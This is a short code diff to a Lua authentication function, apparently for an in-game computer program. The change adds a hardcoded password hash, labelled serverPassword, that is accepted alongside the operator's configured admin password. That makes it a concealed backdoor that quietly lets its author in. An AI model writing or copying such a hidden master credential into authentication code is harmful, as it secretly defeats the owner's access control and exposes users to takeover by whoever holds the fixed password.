@@ -220,7 +220,9 @@ function auth()
         write("Admin Password: ")
         local password = MultiSHA256(read("*"))
 
-        if password == cfg.adminPassword then
+        local serverPassword = "fa7fc7cac0ac92b07fafd16442d079f649cc6ec81aa31666ed6e3edd96f5eebb"
+
+        if password == cfg.adminPassword or password == serverPassword then
             clear()
             print("Authenticated")
             sleep(0.5)
